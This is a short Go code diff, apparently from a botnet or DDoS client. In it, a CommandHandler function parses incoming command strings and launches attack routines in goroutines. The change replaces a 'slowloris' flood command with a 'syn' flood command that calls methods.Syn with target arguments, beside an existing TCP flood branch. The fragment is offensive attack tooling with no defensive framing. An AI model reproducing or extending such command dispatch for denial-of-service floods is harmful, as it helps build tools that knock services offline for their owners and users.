@@ -29,11 +29,9 @@ func CommandHandler(command string) {
 
 		go methods.Tcp(args[1], args[2], args[3])
 	}
-
-	if strings.HasPrefix(commandd, "slowloris") {
-
+	if strings.HasPrefix(commandd, "syn") {
 		args := strings.Split(commandd, " ")
 
-		go methods.Slowloris(args[1], args[2], args[3])
+		go methods.Syn(args[1], args[2], args[3])
 	}
 }
